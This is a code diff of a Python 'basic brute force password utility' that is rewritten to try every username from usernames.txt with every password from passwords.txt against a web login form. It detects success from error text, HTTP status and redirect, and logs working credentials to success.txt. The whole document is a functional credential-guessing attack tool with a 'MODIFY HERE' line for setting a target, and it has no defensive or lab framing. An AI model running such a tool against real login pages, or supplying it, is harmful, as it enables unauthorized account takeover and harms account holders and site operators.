@@ -1,46 +1,58 @@
 import requests
-import string
-import random
 
 ##
-#
 #
 # Basic Brute Force Password Utility
-# brute.py
+# brute(target, "username", "password", "incorrect", "https://www.test.com/")
 #
-# TODO: use a range of random number of characters instead of a fixed length
+# Arguments: URL of target form, Name of username field, Name of password field, Bad login text response, Bad login redirect
+#
 ##
 
-# Generate random password
-# length = number of random characters to use
-def genPassword(length):
-  characters = string.ascii_letters + string.digits + string.punctuation
-  random_characters = ''.join(random.choice(characters) for _ in range(length))
-  return random_characters
+def make_request(url, username, password, username_field, password_field, error_msg, bad_redirect):
+
+  data = {
+    username_field: username,
+    password_field: password
+  }
+
+  # Make post request
+  r = requests.post(url, data=data)
+  
+  # What is part of the bad login response text? (ie: incorrect username or password)
+  if error_msg in r.text.lower():
+    print(f"{username}:{password} unsuccessful")
+    return
+
+  # Did we get a 400 error?
+  if r.status_code == 401 or r.status_code == 403 or r.status_code == 400:
+    print(f"{username}:{password} unsuccessful")
+    return
+  
+  # Did we get redirected to the bad url?
+  if r.url != bad_redirect:
+    # It probably worked...
+    log = username + ':' + password + '\n'
+    print(f"(+) {username}:{password} worked!")
+    with open('success.txt', 'a', encoding='utf-8') as success:
+      success.write(log)
+  else:
+    print(f"{username}:{password} unsuccessful")
+
 
 # Perform brute action
 # url = the URL of the target using POST
-# length = number of random characters to use for the password
-def brute(url, length):
+def brute(url, username_field, password_field, error_msg, bad_redirect):
   # Usernames.txt is the local file to loop through
-  with open('usernames.txt', 'r', encoding='utf-8') as file:
-    for line in file:
-      line = line.strip()
-      password = genPassword(length)
-      data = {
-        'username': line,
-        'password': password
-      }
-      # Uses a POST request against the login form
-      r = requests.post(url, data=data)
-      if r.status_code == 200:
-        log = line + ': ' + password + '\n'
-        # Upon successful login (200 OK), log it to a local file
-        with open('success.txt', 'a', encoding='utf-8') as success:
-          success.write(log)
-      else:
-        print(f"{line} unsuccessful")
+  with open('usernames.txt', 'r', encoding='utf-8') as usernames:
+    for username in usernames:
+      username = username.strip()
+      with open('passwords.txt', 'r', encoding='utf-8') as passwords:
+        for password in passwords:
+          password = password.strip()
+          make_request(url, username, password, username_field, password_field, error_msg, bad_redirect)
 
-# Execute brute action: <URL> <number of characters in password>
-target = "https://www.something.com/login/doLogin"
-brute(target, 5)
+
+# MODIFY HERE
+# Arguments: URL of target form, Name of username field, Name of password field, Bad login text response, Bad login redirect
+brute("https://www.test.com/login/doLogin", "username", "password", "incorrect", "https://www.test.com/")
